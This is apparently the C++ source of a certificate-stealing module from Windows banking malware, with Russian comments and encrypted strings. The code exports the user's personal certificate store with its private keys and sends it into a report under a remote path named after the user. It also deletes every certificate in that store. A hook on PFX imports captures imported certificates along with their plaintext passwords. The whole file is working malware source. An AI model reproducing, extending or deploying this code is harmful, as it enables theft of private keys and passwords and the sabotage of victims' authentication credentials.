#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <security.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "report.h"
#include "certstorehook.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\fs.h"
#include "..\common\debug.h"

/*
  Получение текущего имени пользователя для пути сертификата.

  OUT buffer - буфер для для имени, размером MAX_PATH.
*/
static void getUserNameForPath(LPWSTR buffer)
{
  DWORD size = MAX_PATH;
  if(CWA(secur32, GetUserNameExW)(NameSamCompatible, buffer, &size) != FALSE && size > 0)
  {
    buffer[size] = 0;
    Fs::_replaceSlashes(buffer, '|');
  }
  else
  {
    CryptedStrings::_getW(CryptedStrings::id_username_sam_unknown, buffer);
  }
}

/*
  Экспорт хранилища в отчет.

  IN storeName - имя хранилища.

  Return       - true - если хранилище успещно прочитано и записано в отчет, если сертифкатов > 0.
                 true - если хранилище успещно прочитано и если сертифкатов == 0.
                 false - в случаи ошибки.
*/
static bool exportStore(LPWSTR storeName)
{
  WDEBUG1(WDDT_INFO, "Exporting %s", storeName);
  bool retVal = false;
  
  HANDLE storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
  if(storeHandle != NULL)
  {
    //Получаем кол. сертификатов.
    DWORD certsCount = 0;
    {
      PCCERT_CONTEXT certContext = NULL;
      while((certContext = CWA(crypt32, CertEnumCertificatesInStore)(storeHandle, certContext)) != NULL)certsCount++;
    }

    if(certsCount == 0)retVal = true;
    else 
    {
      //Получаем размер хранилища.
      CRYPT_DATA_BLOB pfxBlob;
      pfxBlob.pbData = NULL;
      pfxBlob.cbData = 0;

      CSTR_GETW(password, certstore_export_password);
      if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE &&
        (pfxBlob.pbData = (LPBYTE)Mem::alloc(pfxBlob.cbData)) != NULL)
      {
        if(CWA(crypt32, PFXExportCertStoreEx)(storeHandle, &pfxBlob, password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
        {
          //Делаем имя хранилища в нижний регистр.
          WCHAR storeNameLower[CryptedStrings::len_certstore_export_remote_path * 2];
          Str::_CopyW(storeNameLower, storeName, -1);
          CWA(kernel32, CharLowerW)(storeNameLower);

          //Генерируем имя.
          WCHAR userName[MAX_PATH];
          WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
          SYSTEMTIME st;
          CWA(kernel32, GetSystemTime)(&st);

          CSTR_GETW(serverPath, certstore_export_remote_path);
          getUserNameForPath(userName);

          if(Str::_sprintfW(pfxName, sizeof(pfxName) / sizeof(WCHAR), serverPath, userName, storeNameLower, st.wDay, st.wMonth, st.wYear) > 0 &&
            Report::writeData(BLT_FILE, storeName, pfxName, pfxBlob.pbData, pfxBlob.cbData))
          {
            retVal = true;
          }
        }
        Mem::free(pfxBlob.pbData);
      }
    }
    CWA(crypt32, CertCloseStore)(storeHandle, 0);
  }
  return retVal;
}

/*
  Очистка хранилища.

  IN storeName - имя хранилища.

  Return       - true - в случаи успеха,
                 false - в случаи ошибки.
*/
static bool clearStore(LPWSTR storeName)
{
  WDEBUG1(WDDT_INFO, "Clearing %s", storeName);
  bool retVal = false;
  
  HANDLE storeHandle = CWA(crypt32, CertOpenSystemStoreW)(NULL, storeName);
  if(storeHandle != NULL)
  {
    PCCERT_CONTEXT certContext = NULL;
    while((certContext = CWA(crypt32, CertEnumCertificatesInStore)(storeHandle, certContext)) != NULL)
    {
      PCCERT_CONTEXT dupCertContext = CWA(crypt32, CertDuplicateCertificateContext)(certContext);
      if(dupCertContext != NULL)CWA(crypt32, CertDeleteCertificateFromStore)(dupCertContext);
    }
    retVal = true;
    CWA(crypt32, CertCloseStore)(storeHandle, 0);
  }
  return retVal;
}

bool CertStoreHook::_exportMy(void)
{
  return exportStore(L"MY");
}

bool CertStoreHook::_clearMy(void)
{
  return clearStore(L"MY");
}

void * WINAPI CertStoreHook::_hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags)
{
  WDEBUG3(WDDT_INFO, "Called, data->cbData=%u, password=%s, flags=0x%08X", data->cbData, password == NULL ? L"" : password, flags);
  
  HCERTSTORE certstore = CWA(crypt32, PFXImportCertStore)(data, password, flags);
  if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL && Core::isActive())
  {
    //Генерируем имя.
    WCHAR userName[MAX_PATH];
    WCHAR pfxName[CryptedStrings::len_certstore_export_remote_path * 2];
    SYSTEMTIME st;
    CWA(kernel32, GetSystemTime)(&st);
      
    //Пишим сертификат.
    CSTR_GETW(serverPath, certstore_export_remote_path);
    CSTR_GETW(prolog, certstore_export_prolog);
    getUserNameForPath(userName);

    if(Str::_sprintfW(pfxName, sizeof(pfxName) / sizeof(WCHAR), serverPath, userName, prolog, st.wDay, st.wMonth, st.wYear) > 0 &&
       Report::writeData(BLT_FILE, NULL, pfxName, data->pbData, data->cbData) && password != NULL && *password != 0)
    {
      Str::_catW(pfxName, L".txt", 4);
      Str::UTF8STRING u8s;
      
      if(Str::_utf8FromUnicode((LPWSTR)password, -1, &u8s))
      {
        Report::writeData(BLT_FILE, NULL, pfxName, u8s.data, u8s.size);
        Str::_utf8Free(&u8s);
      }
    }
  }
  return certstore;
}
